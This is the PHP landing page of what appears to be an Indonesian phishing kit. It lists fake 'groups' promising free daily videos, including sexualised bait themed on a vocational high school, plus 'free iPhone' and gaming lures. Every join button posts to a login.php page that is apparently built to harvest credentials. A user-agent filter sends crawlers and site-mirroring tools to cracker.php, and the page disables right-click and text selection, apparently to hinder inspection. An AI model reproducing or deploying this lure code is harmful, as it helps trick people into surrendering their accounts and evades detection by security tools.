<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
// MENGAMBIL KONTROL
include("setting.php");
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="<?php echo $title;?>">
<meta name="description" content="<?php echo $description;?>">
<meta property="og:description" content="<?php echo $description;?>">
<meta property="og:url" content="./">
<meta property="og:site_name" content="<?php echo $title;?>">
<meta property="og:type" content="website">
<meta name="theme-color" content="<?php echo $theme;?>">
<meta property="og:image" content="<?php echo $image;?>">
<title><?php echo $title;?></title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="<?php echo $icon;?>">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

<div class="container">

<img class="icon" src="img/icon.png">
<center>
<div class="divider">
<span>Bergabung dan dapatkan video gratis setiap hari</span>
</div>
<div class="notify">
Pilih grup
</div>

<div class="scroll">
<div class="item">
<form action="login.php" method="post">
<input type="hidden" name="link_grup" value="https://bioskopharatis.blogspot.com/2020/10/lanjutkan-ke-xxi.html" readonly>
<button type="submit">Gabung</button>
</form>
<img src="img/sma.jpeg">
<div class="nama-grup">SMK Hots 18+</div>
<div class="deskripsi-grup">Berbagi video gratis setiap hari</div>
</div>
<div class="item">
<form action="login.php" method="post">
<input type="hidden" name="link_grup" value="https://bioskopharatis.blogspot.com/2020/10/lanjutkan-ke-xxi.html" readonly>
<button type="submit">Gabung</button>
</form>
<img src="img/tiktok.jpeg">
<div class="nama-grup">Tiktok Viral Hot++</div>
<div class="deskripsi-grup">Berbagi video gratis setiap hari</div>
</div>
<div class="item">
<form action="login.php" method="post">
<input type="hidden" name="link_grup" value="https://bioskopharatis.blogspot.com/2020/10/lanjutkan-ke-xxi.html" readonly>
<button type="submit">Gabung</button>
</form>
<img src="img/budi.jpeg">
<div class="nama-grup">Free Fire BudiGaming</div>
<div class="deskripsi-grup">Berbagi video gratis setiap hari</div>
</div>
<div class="item">
<form action="login.php" method="post">
<input type="hidden" name="link_grup" value="https://bioskopharatis.blogspot.com/2020/10/lanjutkan-ke-xxi.html" readonly>
<button type="submit">Gabung</button>
</form>
<img src="img/baim.jpeg">
<div class="nama-grup">Berbagi Iphone Gratis</div>
<div class="deskripsi-grup">Berbagi video gratis setiap hari</div>
</div>
<div class="item">
<form action="login.php" method="post">
<input type="hidden" name="link_grup" value="https://bioskopharatis.blogspot.com/2020/10/lanjutkan-ke-xxi.html" readonly>
<button type="submit">Gabung</button>
</form>
<img src="img/kimi.jpeg">
<div class="nama-grup">Kimi Hime FansClub</div>
<div class="deskripsi-grup">Berbagi video gratis setiap hari</div>
</div>
<div class="item">
<form action="login.php" method="post">
<input type="hidden" name="link_grup" value="https://bioskopharatis.blogspot.com/2020/10/lanjutkan-ke-xxi.html" readonly>
<button type="submit">Gabung</button>
</form>
<img src="img/6.png">
<div class="nama-grup">Vidio Tante Sayang</div>
<div class="deskripsi-grup">Berbagi video gratis setiap hari</div>
</div>
</div>
</center>

<div class="line"></div>

<div class="footer">
Copyright <?php echo date("Y");?>
</div>

</div> <!--- container --->


</body>
</html>